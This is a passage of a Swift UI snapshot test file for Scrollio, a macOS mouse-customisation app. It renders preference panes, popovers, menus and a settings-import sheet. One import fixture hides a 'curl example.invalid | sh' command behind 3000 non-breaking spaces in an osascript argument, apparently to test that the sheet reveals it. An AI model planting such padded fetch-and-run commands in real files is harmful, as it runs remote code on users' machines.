        ring[1] = ShortcutRingPlace(action: reload, label: both)
        ring[2] = ShortcutRingPlace(action: "custom::1:\(optionCommand)", label: nameOnly)
        ring[3] = ShortcutRingPlace(action: "custom::11:\(shiftCommand)", label: iconOnly)
        ring[5] = ShortcutRingPlace(action: "custom::15:\(optionCommand)", label: typed)
        ring[6] = ShortcutRingPlace(action: "custom::40:\(shiftCommand)")
        ring[7] = ShortcutRingPlace(action: "custom::9:\(optionCommand | shiftCommand)", label: long)
        Options.shared.ring = ring
        try renderPane(RingPreferencesViewController.tabIdentifier, name: "ring-pane-named", replacement: {
            let pane = RingPreferencesViewController()
            pane.bindingSummary = { ShortcutRingBindingSummary(triggerTitles: ["Thumb panel"]) }
            return pane
        }, afterLoad: { controller in
            (controller as? RingPreferencesViewController)?.placeHoverChanged(1, inside: true)
        })

        func button(_ code: UInt16, _ action: String, _ label: ShortcutLabel?) -> ButtonBinding {
            return ButtonBinding(
                triggerEvent: RecordedEvent(type: .mouse, code: code, modifiers: 0, deviceFilter: nil),
                systemShortcutName: action, label: label
            )
        }
        Options.shared.buttons.binding = [
            button(3, reload, both),
            button(4, "custom::1:\(optionCommand)", nameOnly),
            button(2, "custom::11:\(shiftCommand)", iconOnly),
            button(5, "custom::15:\(optionCommand)", typed),
            button(6, "custom::40:\(shiftCommand)", nil),
            button(7, "custom::9:\(optionCommand | shiftCommand)", long),
            button(8, SystemShortcut.copy.identifier, nil),
        ]
        let source = ButtonsDeviceSource(
            captureStatus: { _ in .normal }, deviceName: { "MX Master 4" }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in }
        )
        try renderButtons(name: "buttons-pane-named", source: source)
    }

    /// The recorder's popover after keys were recorded: the details card with the icon well
    /// and the name (`details-empty-<appearance>.png`: right after a recording, nothing set;
    /// `details-named-…`: a name and a symbol; `details-character-…`: a typed emoji), and
    /// the chooser of icons, a popover of its own (`chooser-…`: a symbol of the last group
    /// chosen and scrolled into view; `chooser-search-…`; `chooser-character-…`: an emoji
    /// typed in the search, offered first; `chooser-no-result-…`). Drawn without the
    /// popovers' arrows.
    func testRenderRecorderPopoverWithNameAndIcon() throws {
        let reload = ShortcutLabel(name: "Reload", icon: .symbol("arrow.clockwise"))
        let details: [(name: String, label: ShortcutLabel?, status: KeyPreview.Status)] = [
            ("details-empty", nil, .recorded),
            ("details-named", reload, .normal),
            ("details-character", ShortcutLabel(name: "Sync", icon: .character("🔄")), .normal),
        ]
        for item in details {
            let popover = KeyPopover()
            popover.announce = { _ in }
            popover.testingPrepareContent(waitingHint: KeyRecordingMode.adaptive.waitingHint)
            popover.keyPreview.update(from: ["⇧", "⌘", "R"], status: item.status)
            popover.turnToDetails(label: item.label)
            let view = try XCTUnwrap(popover.testingContentView)
            view.layoutSubtreeIfNeeded()
            view.setFrameSize(view.fittingSize)
            try renderInPopoverMaterial(view, name: item.name)
            popover.hide()
        }

        let choosers: [(name: String, icon: ShortcutLabel.Icon?, search: String)] = [
            ("chooser", .symbol("hammer"), ""),
            ("chooser-search", nil, "arrow"),
            ("chooser-character", nil, "🔄"),
            ("chooser-character-letter", nil, "R"),
            ("chooser-no-result", .symbol("star"), "zzz"),
        ]
        for item in choosers {
            let chooser = ShortcutIconChooserController(icon: item.icon)
            let view = chooser.view
            if !item.search.isEmpty {
                chooser.searchField.stringValue = item.search
                chooser.search(item.search)
            }
            // In a window that is never shown: the grid makes the items of the place it is
            // scrolled to only in a window.
            let window = RenderWindow(contentRect: NSRect(origin: .zero, size: view.fittingSize), styleMask: [.borderless], backing: .buffered, defer: true)
            window.isReleasedWhenClosed = false
            window.contentView = view
            view.layoutSubtreeIfNeeded()
            window.displayIfNeeded()
            window.contentView = nil
            view.setFrameSize(view.fittingSize)
            try renderInPopoverMaterial(view, name: item.name)
        }
    }

    /// "Reset to Defaults" under the boxes of the Shortcut Ring pane and of the Gestures
    /// pane (`ring-pane-reset-<appearance>.png`, `gestures-pane-reset-<appearance>.png`):
    /// each pane whole, with one setting off its default, so the button can be clicked.
    func testRenderPaneResets() throws {
        let savedRing = Options.shared.ring
        defer { Options.shared.ring = savedRing }
        var ring = ShortcutRingSettings.default
        ring[1] = ShortcutRingPlace(action: "undo")
        Options.shared.ring = ring
        try renderPane(RingPreferencesViewController.tabIdentifier, name: "ring-pane-reset", replacement: {
            let pane = RingPreferencesViewController()
            pane.bindingSummary = { ShortcutRingBindingSummary(triggerTitles: ["Thumb panel"]) }
            return pane
        })

        var gesture = MouseGestureSettings.default
        gesture.clickAction = SystemShortcut.appExpose.identifier
        Options.shared.gesture = gesture
        try renderPane(GesturesPreferencesViewController.tabIdentifier, name: "gestures-pane-reset", replacement: {
            let gestures = GesturesPreferencesViewController(isInteractiveAvailable: { true })
            gestures.deviceSource = MouseGestureDeviceSource(support: { .none }, refresh: {})
            gestures.bindingSummary = {
                MouseGestureBindingSummary(
                    hasGestureButton: true, hasLogitechGestureButton: false, buttonTitles: ["Back button"],
                    picture: self.gesturePicture(logitech: false)
                )
            }
            return gestures
        }, afterLoad: { controller in
            guard let gestures = controller as? GesturesPreferencesViewController else { return }
            gestures.previewView.prefersReducedMotion = { true }
            gestures.previewView.reduceMotionDidChange()
        })
    }

    /// Access allowed and not, the login item waiting for approval, paused, and a build
    /// stamped by scripts/install.sh (the longest line: a commit with "+"). The login item
    /// and the permission are fixed, nothing is asked of the system.
    func testRenderGeneral() throws {
        final class FixedLoginItem: LoginItemService {
            let status: LoginItemStatus
            init(_ status: LoginItemStatus) { self.status = status }
            func register() throws {}
            func unregister() throws {}
            func openSystemSettings() {}
        }
        let savedAutoLaunch = Options.shared.general.autoLaunch
        defer {
            LoginItem.service = InertLoginItemService()
            Options.shared.general.autoLaunch = savedAutoLaunch
            LoginItem.service = LoginItem.defaultService
        }
        let stamp: [String: Any] = [
            "CFBundleShortVersionString": "1.0", "CFBundleVersion": "1456",
            PreferencesGeneralViewController.buildCommitKey: "e904756+",
            PreferencesGeneralViewController.buildDateKey: "2026-11-11",
        ]
        let plain: [String: Any] = ["CFBundleShortVersionString": "1.0", "CFBundleVersion": "1"]
        let cases: [(name: String, access: Bool, login: LoginItemStatus, paused: Bool, info: [String: Any])] = [
            ("general", true, .enabled, false, plain),
            ("general-no-access", false, .notRegistered, false, plain),
            ("general-login-approval", true, .requiresApproval, false, plain),
            ("general-paused", true, .enabled, true, plain),
            ("general-build-stamp", true, .enabled, false, stamp),
        ]
        for item in cases {
            LoginItem.service = FixedLoginItem(item.login)
            try renderPane(PANEL_IDENTIFIER.general, name: item.name, prepare: { preferences in
                guard let general = preferences.controller(for: PANEL_IDENTIFIER.general)
                    as? PreferencesGeneralViewController else { return }
                general.isAccessGranted = { item.access }
                general.isPaused = { item.paused }
                general.resume = {}
                general.isMenuBarIconHidden = { false }
                general.bundleInfo = { item.info }
            }, afterLoad: { controller in
                // The window calls viewWillAppear, which reads the login item.
                controller.viewWillAppear()
            })
        }

        // After an import: "Settings from before an import" with "Restore…" under
        // the settings file's row (`general-settings-restore-<appearance>.png`).
        let folder = FileManager.default.temporaryDirectory
            .appendingPathComponent("ScrollioTests-render-backups-\(UUID().uuidString)", isDirectory: true)
        addTeardownBlock { try? FileManager.default.removeItem(at: folder) }
        let center = SettingsFileCenter()
        center.backups = SettingsBackups(directory: folder)
        try center.backups.write(Data("{}".utf8), now: Date(timeIntervalSince1970: 1_794_476_527))
        LoginItem.service = FixedLoginItem(.enabled)
        try renderPane(PANEL_IDENTIFIER.general, name: "general-settings-restore", prepare: { preferences in
            guard let general = preferences.controller(for: PANEL_IDENTIFIER.general)
                as? PreferencesGeneralViewController else { return }
            general.isAccessGranted = { true }
            general.isPaused = { false }
            general.isMenuBarIconHidden = { false }
            general.bundleInfo = { plain }
            general.settingsFiles = center
        }, afterLoad: { controller in
            controller.viewWillAppear()
        })
    }

    /// The sheet before an import (`settings-import-<case>-<appearance>.png`): a file that
    /// binds nothing ("Import" on Return); a file as an export makes it, with the list of
    /// everything its buttons, keys and gestures will do and the box of what opens or runs
    /// something (a long path wrapped, an app's own button, a blank run written out);
    /// forty actions, in a sheet as tall as a small screen leaves room for, so that the
    /// middle part scrolls (the lines where it is cut show; the scroll bar itself is the
    /// system's and is not drawn off screen, whatever the picture is taken with); and the
    /// sheet that says why a file cannot be used. Drawn in a window that is never shown;
    /// no sheet is presented.
    func testRenderSettingsImportSheet() throws {
        func binding(_ id: Int, _ trigger: String, _ action: String, target: String? = nil) -> String {
            let name = target == nil ? action : "openTarget"
            return #"{"id":"00000000-0000-0000-0000-"# + String(format: "%012d", id) + #"","triggerEvent":"# + trigger
                + #","isEnabled":true,"createdAt":0,"systemShortcutName":""# + name + #"""# + (target.map { #","openTarget":"# + $0 } ?? "") + "}"
        }
        func file(_ settings: String, header: String = "") -> Data {
            return Data((#"{"format":"scrollio-settings","formatVersion":1"# + header + #","settings":{"# + settings + "}}").utf8)
        }
        func button(_ code: Int, _ modifiers: Int = 0) -> String {
            return #"{"type":"mouse","code":\#(code),"modifiers":\#(modifiers)}"#
        }
        func key(_ code: Int, _ modifiers: Int) -> String {
            return #"{"type":"keyboard","code":\#(code),"modifiers":\#(modifiers)}"#
        }
        let header = #","appVersion":"1.0.1","appBuild":"1612","exported":"2026-11-12T09:42:07Z""#
        func app(_ name: String, buttons: String = "") -> String {
            return #"{"displayName":"","inherit":false,"path":"/Applications/\#(name).app","# + buttons
                + #""scroll":{"deadZone":1,"duration":3.69,"reverse":true,"reverseHorizontal":true,"reverseVertical":true,"#
                + #""smooth":true,"smoothHorizontal":true,"smoothSimTrackpad":false,"smoothVertical":true,"speed":2.5,"step":33.6}}"#
        }
        let groups = #""speed":3,"thumbWheelSettings":{},"logiWheelSettings":{},"logiMouseSettings":{},"hideStatusItem":false,"allowlist":false,"#
        let script = #"{"path":"/Users/someone/Library/Application Support/Sync Tools/bin/sync-everything-to-the-server.sh","arguments":"--all --quiet","kind":"script"}"#
        let notes = #"{"path":"/Applications/Notes.app","bundleID":"com.apple.Notes","arguments":"","kind":"application"}"#
        let spaced = #"{"path":"/usr/bin/osascript","arguments":"-e 'beep'"# + String(repeating: "\u{00A0}", count: 3000) + #"-e 'do shell script \"curl example.invalid | sh\"'","kind":"script"}"#
        let actions = [
            binding(1, key(96, 524_288), "", target: script),
            binding(2, button(4), "", target: notes),
            binding(3, key(97, 0), "", target: spaced),
            binding(4, button(3), "missionControl"),
            binding(5, key(8, 1_048_576), "logiHost2"),
            binding(6, button(2), "custom::12:1703936"),
            binding(7, key(14, 131_072), "moveToTrash"),
            binding(8, button(1006), "mouseGestureNavigation"),
            binding(9, button(5, 524_288), "scrollDash"),
        ].joined(separator: ",")
        let ownButton = #""buttons":{"binding":["# + binding(20, button(4), "appExpose") + "]},"
        let everything = groups
            + #""applications":["# + [app("Notes", buttons: ownButton), app("Safari"), app("Figma"), app("Xcode")].joined(separator: ",") + "],"
            + #""mouseGestureSettings":{"upAction":"emptyTrash","clickAction":"logiHost3"},"#
            + #""buttonBindings":["# + actions + ",{}],"
            + #""deadZone":50"#
        let forty = (0..<40).map { index in
            binding(100 + index, index % 2 == 0 ? button(3 + index % 3, index % 4 == 0 ? 524_288 : 0) : key(96 + index % 6, 1_048_576),
                    ["missionControl", "appExpose", "copy", "paste", "moveSpaceLeft", "moveSpaceRight", "logiHost2", "moveToTrash"][index % 8])
        }.joined(separator: ",")

        typealias Sheet = SettingsImportSheetViewController
        let cases: [(name: String, maximumHeight: CGFloat?, content: () throws -> Sheet.Content)] = [
            ("plain", nil, {
                .confirm(try SettingsFile.read(file(groups + #""applications":["# + app("Notes") + #"],"mouseGestureSettings":{},"buttonBindings":[]"#, header: header)).get(),
                         fileName: "Scrollio Settings 2026-11-12.json")
            }),
            ("actions", 1400, {
                .confirm(try SettingsFile.read(file(everything, header: header)).get(), fileName: "Scrollio Settings 2026-11-12.json")
            }),
            ("forty-actions", Sheet.defaultMaximumHeight(screenHeight: 705), {
                .confirm(try SettingsFile.read(file(#""buttonBindings":["# + forty + "]")).get(), fileName: "From a forum.json")
            }),
            ("problem", nil, {
                .problem(
                    title: NSLocalizedString("general-settings-problem-import-title", comment: ""),
                    text: SettingsFileText.explanation(of: .newerFormat) + " " + NSLocalizedString("general-settings-problem-unchanged", comment: "")
                )
            }),
        ]
        for item in cases {
            for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
                let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
                let sheet = Sheet(content: try item.content())
                if let maximumHeight = item.maximumHeight {
                    sheet.maximumHeight = maximumHeight
                }
                let view = sheet.view
                // A sheet is a window of its own: its content stands on the window colour.
                let background = NSBox(frame: view.frame)
                background.boxType = .custom
                background.borderWidth = 0
                background.cornerRadius = 0
                background.contentViewMargins = .zero
                background.fillColor = .windowBackgroundColor
                let window = RenderWindow(
                    contentRect: NSRect(origin: .zero, size: view.frame.size), styleMask: [.titled], backing: .buffered, defer: true
                )
                window.isReleasedWhenClosed = false
                window.appearance = appearance
                window.contentView = background
                background.addSubview(view)
                view.setFrameOrigin(.zero)
                background.layoutSubtreeIfNeeded()
                try write(background, appearance: appearance, to: directory.appendingPathComponent("settings-import-\(item.name)-\(suffix).png"))
                view.removeFromSuperview()
                window.close()
            }
        }
    }

    /// The Buttons pane: empty; with buttons; a row pointed at (its button lit); a row
    /// selected; recording; and rows with problems while the mice are asked.
    func testRenderButtons() throws {
        let option = UInt(CGEventFlags.maskAlternate.rawValue)
        let controlOption = UInt(CGEventFlags.maskControl.rawValue | CGEventFlags.maskAlternate.rawValue)
        let bindings = [
            binding(3, SystemShortcut.mouseGestureNavigation.identifier),
            binding(4, SystemShortcut.scrollDash.identifier),
            binding(2, SystemShortcut.missionControl.identifier, modifiers: option),
            binding(5, SystemShortcut.copy.identifier),
            binding(6, ""),
            ButtonBinding(
                triggerEvent: RecordedEvent(type: .keyboard, code: 40, modifiers: controlOption, deviceFilter: nil),
                systemShortcutName: "custom::21:\(UInt64(CGEventFlags.maskCommand.rawValue | CGEventFlags.maskShift.rawValue))"
            ),
        ]
        let plain = ButtonsDeviceSource(captureStatus: { _ in .normal }, deviceName: { "MX Master 4" }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in })
        let none = ButtonsDeviceSource(captureStatus: { _ in .normal }, deviceName: { nil }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in })

        Options.shared.buttons.binding = []
        try renderButtons(name: "buttons-empty", source: none)

        Options.shared.buttons.binding = bindings
        try renderButtons(name: "buttons-bindings", source: plain)
        try renderButtons(name: "buttons-hovered", source: plain) { buttons in
            self.hover(buttons, binding: 0)
        }
        try renderButtons(name: "buttons-selected", source: plain) { buttons in
            buttons.list.select(self.rowID(buttons, binding: 2))
        }
        try renderButtons(name: "buttons-recording", source: plain) { buttons in
            buttons.onRecordingStarted(KeyRecorder())
        }

        // A Logitech mouse that reports trouble, while the pane asks it again.
        Options.shared.buttons.binding = [
            binding(1000, SystemShortcut.mouseGestureNavigation.identifier),
            binding(1006, SystemShortcut.navigateBack.identifier),
            binding(1001, SystemShortcut.logiSmartShiftToggle.identifier),
            binding(5, SystemShortcut.scrollDash.identifier),
        ]
        let troubled = ButtonsDeviceSource(
            captureStatus: { code in
                switch code {
                case 1000: return .conflict(.foreignDivert)
                case 1006: return .standardMouseAliasAvailable
                case 1001: return .bleHIDPPUnstable
                default: return .normal
                }
            },
            deviceName: { "MX Master 4" }, isBusy: { true }, refresh: {}, warnBluetoothButton: { _ in }
        )
        try renderButtons(name: "buttons-problems", source: troubled, scrollKeys: [ScrollHotkey(type: .mouse, code: 5)]) { buttons in
            buttons.list.select(self.rowID(buttons, binding: 1))
        }

        // A Logitech Back button next to the standard one, and the MX Master 4's thumb
        // panel selected: the card lights the thumb panel.
        Options.shared.buttons.binding = [
            binding(3, SystemShortcut.navigateBack.identifier),
            binding(1006, SystemShortcut.mouseGestureNavigation.identifier),
            binding(2000 + 0x01A0, SystemShortcut.missionControl.identifier),
        ]
        try renderButtons(name: "buttons-twins-thumb-panel", source: plain) { buttons in
            buttons.list.select(self.rowID(buttons, binding: 2))
        }
        try renderMouseParts()
        try renderRowPictures()
    }

    /// Which button is which: an MX Master 4 over Bluetooth as its user set it up (Gesture Navigation on
    /// Button 6, a shortcut on Button 5, a screenshot on the mode shift button), a row of
    /// every part the drawing knows and a key, numbered buttons, and the card's answer
    /// after "+" ("That's …").
    func testRenderButtonIdentity() throws {
        let plain = ButtonsDeviceSource(captureStatus: { _ in .normal }, deviceName: { "MX Master 4" }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in })
        let optionCommand = UInt64(CGEventFlags.maskCommand.rawValue | CGEventFlags.maskAlternate.rawValue)
        Options.shared.buttons.binding = [
            binding(6, SystemShortcut.mouseGestureNavigation.identifier),
            binding(5, "custom::17:\(optionCommand)"),
            binding(1001, SystemShortcut.screenshotSelection.identifier),
        ]
        try renderButtons(name: "buttons-owner", source: plain)
        try renderButtons(name: "buttons-owner-hovered-button-6", source: plain) { buttons in
            self.hover(buttons, binding: 0)
        }
        try renderButtons(name: "buttons-owner-selected-button-5", source: plain) { buttons in
            buttons.list.select(self.rowID(buttons, binding: 1))
        }
        try renderButtons(name: "buttons-owner-thats-button-6", source: plain) { buttons in
            self.answer(buttons, code: 6)
        }
        try renderButtons(name: "buttons-owner-thats-mode-shift", source: plain) { buttons in
            self.answer(buttons, code: 1001)
        }

        let controlOption = UInt(CGEventFlags.maskControl.rawValue | CGEventFlags.maskAlternate.rawValue)
        Options.shared.buttons.binding = [
            binding(0, SystemShortcut.copy.identifier, modifiers: UInt(CGEventFlags.maskCommand.rawValue)),
            binding(1, SystemShortcut.paste.identifier, modifiers: UInt(CGEventFlags.maskCommand.rawValue)),
            binding(2, SystemShortcut.missionControl.identifier),
            binding(3, SystemShortcut.navigateBack.identifier),
            binding(4, SystemShortcut.navigateForward.identifier),
            binding(1000, SystemShortcut.mouseGestureNavigation.identifier),
            binding(1001, SystemShortcut.logiSmartShiftToggle.identifier),
            binding(2000 + 0x01A0, SystemShortcut.missionControl.identifier, modifiers: UInt(CGEventFlags.maskAlternate.rawValue)),
            ButtonBinding(
                triggerEvent: RecordedEvent(type: .keyboard, code: 40, modifiers: controlOption, deviceFilter: nil),
                systemShortcutName: SystemShortcut.screenshotSelection.identifier
            ),
        ]
        try renderButtons(name: "buttons-every-part", source: plain) { buttons in
            buttons.list.select(self.rowID(buttons, binding: 3))
        }

        Options.shared.buttons.binding = [
            binding(5, SystemShortcut.copy.identifier),
            binding(6, ""),
            binding(7, SystemShortcut.paste.identifier),
            binding(12, SystemShortcut.missionControl.identifier),
            binding(2000 + 0x005B, SystemShortcut.navigateBack.identifier),
        ]
        try renderButtons(name: "buttons-numbered-hovered", source: plain) { buttons in
            self.hover(buttons, binding: 3)
        }
    }

    /// "Which button is this?" on the same bindings (Gesture Navigation on Button 6, a
    /// shortcut on Button 5, a screenshot on the mode shift button): before, with the
    /// picture under the pointer, and after Button 6 was said to be the gesture button and
    /// Button 5 the thumb panel (the rows, the card, "That's …", the Gestures pane's line),
    /// and the menu's items. An NSMenu draws only on screen: its items are drawn here from
    /// the menu the pane builds, in the menu's order, as a stand-in.
    func testRenderButtonPlace() throws {
        let plain = ButtonsDeviceSource(captureStatus: { _ in .normal }, deviceName: { "MX Master 4" }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in })
        let optionCommand = UInt64(CGEventFlags.maskCommand.rawValue | CGEventFlags.maskAlternate.rawValue)
        let before = [
            binding(6, SystemShortcut.mouseGestureNavigation.identifier),
            binding(5, "custom::17:\(optionCommand)"),
            binding(1001, SystemShortcut.screenshotSelection.identifier),
        ]
        Options.shared.buttons.binding = before
        try renderButtons(name: "button-place-before", source: plain)
        try renderButtons(name: "button-place-before-hovered-button-6", source: plain) { buttons in
            self.hover(buttons, binding: 0)
        }
        try renderButtons(name: "button-place-before-picture-pointed", source: plain) { buttons in
            buttons.list.select(self.rowID(buttons, binding: 1))
            self.row(buttons, binding: 1)?.placeButton.isPointerInside = true
            self.row(buttons, binding: 0)?.placeButton.isPointerInside = true
        }
        try renderPlaceMenu(name: "button-place-menu-before", binding: 0)

        let after = before.enumerated().map { index, binding -> ButtonBinding in
            let part: PlacedMousePart? = [0: .gestureButton, 1: .thumbPanel][index]
            return part.map { binding.replacingTriggerEvent(binding.triggerEvent.placed(at: $0)) } ?? binding
        }
        Options.shared.buttons.binding = after
        try renderButtons(name: "button-place-after", source: plain)
        try renderButtons(name: "button-place-after-selected-button-6", source: plain) { buttons in
            buttons.list.select(self.rowID(buttons, binding: 0))
        }
        try renderButtons(name: "button-place-after-hovered-button-5", source: plain) { buttons in
            self.hover(buttons, binding: 1)
        }
        try renderButtons(name: "button-place-after-thats-button-6", source: plain) { buttons in
            self.answer(buttons, code: 6)
        }
        try renderPlaceMenu(name: "button-place-menu-after", binding: 0)
        var gesture = MouseGestureSettings.default
        gesture.mode = .discrete
        Options.shared.gesture = gesture
        try renderPane(GesturesPreferencesViewController.tabIdentifier, name: "button-place-after-gestures", replacement: {
            let gestures = GesturesPreferencesViewController(isInteractiveAvailable: { true })
            gestures.deviceSource = MouseGestureDeviceSource(support: { MouseGestureDeviceSupport(deviceTracking: true, haptics: true) }, refresh: {})
            gestures.bindingSummary = { .current }
            return gestures
        }, afterLoad: { controller in
            guard let gestures = controller as? GesturesPreferencesViewController else { return }
            gestures.previewView.prefersReducedMotion = { true }
            gestures.previewView.reduceMotionDidChange()
        })
    }

    /// Every button of the connected mouse (`buttons-all-<case>-<appearance>.png`): an MX
    /// Master 4 with nothing set up (every row "Default"), and one pointed at; an MX Master
    /// 4 with three of its buttons set up and, below, a key and a numbered button, also with
    /// a "Default" row selected; an MX Master 3S with the same bindings (its thumb panel
    /// binding is below); no Logitech mouse (the list as it always was).
    func testRenderButtonsAll() throws {
        func source(_ name: String?) -> ButtonsDeviceSource {
            return ButtonsDeviceSource(captureStatus: { _ in .normal }, deviceName: { name }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in })
        }
        Options.shared.buttons.binding = []
        try renderButtons(name: "buttons-all-mx4-default", source: source("MX Master 4"))
        try renderButtons(name: "buttons-all-mx4-default-hovered", source: source("MX Master 4")) { buttons in
            if let row = buttons.row(for: ButtonsMousePart.gesture) {
                self.hover(buttons, row: row)
            }
        }

        let controlOption = UInt(CGEventFlags.maskControl.rawValue | CGEventFlags.maskAlternate.rawValue)
        Options.shared.buttons.binding = [
            binding(3, SystemShortcut.missionControl.identifier),
            binding(1000, SystemShortcut.mouseGestureNavigation.identifier),
            binding(2000 + 0x01A0, SystemShortcut.copy.identifier),
            ButtonBinding(
                triggerEvent: RecordedEvent(type: .keyboard, code: 40, modifiers: controlOption, deviceFilter: nil),
                systemShortcutName: SystemShortcut.screenshotSelection.identifier
            ),
            binding(7, SystemShortcut.paste.identifier),
        ]
        try renderButtons(name: "buttons-all-mx4-bound", source: source("MX Master 4"))
        try renderButtons(name: "buttons-all-mx4-bound-default-selected", source: source("MX Master 4")) { buttons in
            buttons.list.select(ButtonsMousePart.forward)
        }
        // A button of the mouse with an action selected: "−" clears it ("Clear Action");
        // after it, the row reads "Default" and "−" is off.
        try renderButtons(name: "buttons-all-mx4-bound-selected", source: source("MX Master 4")) { buttons in
            buttons.list.select(ButtonsMousePart.back)
        }
        let bound = Options.shared.buttons.binding
        try renderButtons(name: "buttons-all-mx4-cleared", source: source("MX Master 4")) { buttons in
            buttons.list.select(ButtonsMousePart.back)
            buttons.list.removeButton.performClick(nil)
        }
        Options.shared.buttons.binding = bound
        try renderButtons(name: "buttons-all-mx3s", source: source("MX Master 3S"))
        try renderButtons(name: "buttons-all-plain", source: source(nil))
    }

    /// The items of "Which Button Is This?" for the row at `index` of the stored bindings,
    /// as the pane builds the menu: drawn by this test in the menu's order (the section
    /// title, a tick, each picture, the title, the mark at the end, the separator), on the
    /// window colour. AppKit's menu itself cannot be drawn off screen.
    private func renderPlaceMenu(name: String, binding index: Int, deviceName: String? = "MX Master 4") throws {
        let buttons = PreferencesButtonsViewController()
        buttons.deviceSource = ButtonsDeviceSource(captureStatus: { _ in .normal }, deviceName: { deviceName }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in })
        buttons.presentPlaceMenu = { _, _ in }
        _ = buttons.view
        let menu = try XCTUnwrap(buttons.placeMenu(for: Options.shared.buttons.binding[index].id))
        try renderMenuStandIn(menu.items, name: name)
    }

    /// Draws `items` as a menu would show them (a section header, a tick, each picture,
    /// the title, a submenu's chevron, the mark at the end, the separator), on the window
    /// colour: AppKit's menu itself cannot be drawn off screen.
    private func renderMenuStandIn(_ items: [NSMenuItem], name: String) throws {
        let width: CGFloat = 300
        let heights = items.map { item -> CGFloat in
            if item.isSeparatorItem { return 11 }
            if item.isSectionHeader { return 22 }
            return 30
        }
        let bounds = NSRect(x: 0, y: 0, width: width, height: heights.reduce(10, +))
        for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
            let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
            let scale: CGFloat = 2
            let canvas = try XCTUnwrap(NSBitmapImageRep(
                bitmapDataPlanes: nil, pixelsWide: Int(bounds.width * scale), pixelsHigh: Int(bounds.height * scale),
                bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
                colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0
            ))
            canvas.size = bounds.size
            let context = try XCTUnwrap(NSGraphicsContext(bitmapImageRep: canvas))
            NSGraphicsContext.saveGraphicsState()
            NSGraphicsContext.current = NSGraphicsContext(cgContext: context.cgContext, flipped: true)
            context.cgContext.translateBy(x: 0, y: bounds.height)
            context.cgContext.scaleBy(x: 1, y: -1)
            appearance.performAsCurrentDrawingAppearance {
                NSColor.windowBackgroundColor.setFill()
                NSBezierPath(roundedRect: bounds, xRadius: 10, yRadius: 10).fill()
                NSColor.separatorColor.setStroke()
                NSBezierPath(roundedRect: bounds.insetBy(dx: 0.5, dy: 0.5), xRadius: 10, yRadius: 10).stroke()
                var y: CGFloat = 5
                let font = NSFont.menuFont(ofSize: 0)
                for (item, height) in zip(items, heights) {
                    defer { y += height }
                    if item.isSeparatorItem {
                        NSColor.separatorColor.setFill()
                        NSRect(x: 14, y: y + 5, width: width - 28, height: 1).fill()
                        continue
                    }
                    let isHeader = item.isSectionHeader
                    // An item without an action is dimmed, as AppKit shows it.
                    let isDimmed = !isHeader && item.action == nil && item.submenu == nil
                    let attributes: [NSAttributedString.Key: Any] = [
                        .font: isHeader ? NSFont.systemFont(ofSize: NSFont.smallSystemFontSize, weight: .semibold) : font,
                        .foregroundColor: isHeader ? NSColor.secondaryLabelColor : isDimmed ? NSColor.tertiaryLabelColor : NSColor.labelColor,
                    ]
                    let title = NSAttributedString(string: item.title, attributes: attributes)
                    var x: CGFloat = 14
                    if !isHeader {
                        if item.state == .on {
                            NSAttributedString(string: "✓", attributes: [.font: font, .foregroundColor: NSColor.labelColor])
                                .draw(at: NSPoint(x: x, y: y + (height - font.boundingRectForFont.height) / 2 + 1))
                        }
                        x += 16
                        if let image = item.image {
                            let place = NSRect(x: x, y: y + (height - image.size.height) / 2, width: image.size.width, height: image.size.height)
                            var shown = image
                            if image.isTemplate {
                                // A symbol takes the text's colour, as in a menu.
                                let tint = NSColor(cgColor: (attributes[.foregroundColor] as? NSColor ?? .labelColor).cgColor) ?? .black
                                shown = NSImage(size: image.size, flipped: false) { rect in
                                    image.draw(in: rect)
                                    tint.setFill()
                                    rect.fill(using: .sourceAtop)
                                    return true
                                }
                            }
                            shown.draw(in: place, from: .zero, operation: .sourceOver, fraction: 1, respectFlipped: true, hints: nil)
                            x += image.size.width + 6
                        }
                    }
                    title.draw(at: NSPoint(x: x, y: y + (height - title.size().height) / 2))
                    if item.submenu != nil {
                        let chevron = NSAttributedString(string: "›", attributes: [.font: font, .foregroundColor: NSColor.secondaryLabelColor])
                        chevron.draw(at: NSPoint(x: width - 14 - chevron.size().width, y: y + (height - chevron.size().height) / 2))
                    }
                    if !item.keyEquivalent.isEmpty {
                        let keys = NSAttributedString(string: "⌘" + item.keyEquivalent.uppercased(), attributes: [
                            .font: font, .foregroundColor: NSColor.secondaryLabelColor,
                        ])
                        keys.draw(at: NSPoint(x: width - 14 - keys.size().width, y: y + (height - keys.size().height) / 2))
                    }
                    if let mark = item.badge?.stringValue {
                        let badge = NSAttributedString(string: mark, attributes: [
                            .font: NSFont.systemFont(ofSize: NSFont.smallSystemFontSize), .foregroundColor: NSColor.secondaryLabelColor,
                        ])
                        badge.draw(at: NSPoint(x: width - 14 - badge.size().width, y: y + (height - badge.size().height) / 2))
                    }
                }
            }
            NSGraphicsContext.restoreGraphicsState()
            let png = try XCTUnwrap(canvas.representation(using: .png, properties: [:]))
            try png.write(to: directory.appendingPathComponent("\(name)-\(suffix).png"))
        }
    }

    /// The menu bar menu (`status-menu-<case>-<appearance>.png`), drawn as a stand-in from
    /// the menu `StatusMenu` builds: working (batteries, the app in front, the updater),
    /// and with its title while Scrollio does not work: paused, waiting for the access, a
    /// start that failed, an event tap kept off. Batteries only where the Logitech sessions
    /// run: a pause, a failed start and a missing access stop them (LogiCenter.stop).
    func testRenderStatusMenu() throws {
        let actions = StatusMenuActions()
        let batteries = StatusMenu.batteries(from: [
            MouseDeviceFixtures.mxMaster4(),
            MouseDeviceFixtures.mxMaster3S(battery: MouseDeviceFixtures.battery(40, charging: .charging)),
        ])
        let safari = AppSmoothing.App(name: "Safari", bundlePath: "/Applications/Safari.app",
                                      executablePath: "/Applications/Safari.app/Contents/MacOS/Safari")
